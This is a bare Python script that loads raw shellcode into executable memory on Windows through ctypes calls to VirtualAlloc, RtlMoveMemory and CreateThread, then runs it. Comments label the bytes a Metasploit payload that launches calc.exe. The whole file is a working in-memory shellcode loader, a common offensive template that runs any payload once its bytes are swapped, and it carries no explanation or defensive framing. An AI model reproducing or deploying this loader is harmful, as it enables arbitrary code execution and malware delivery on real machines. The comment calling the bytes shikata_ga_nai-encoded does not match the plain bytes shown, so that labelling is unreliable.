import ctypes
#ShellCode
#x86/shikata_ga_nai succeeded with size 227 (iteration=1)
#Metasploit windows/exec calc.exe
shellcode = 
bytearray("\x31\xd2\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30"
"\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c\x8b"
"\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c"
"\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0\x8b\x74\x1f"
"\x1c\x01\xfe\x03\x3c\xae\xff\xd7")
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
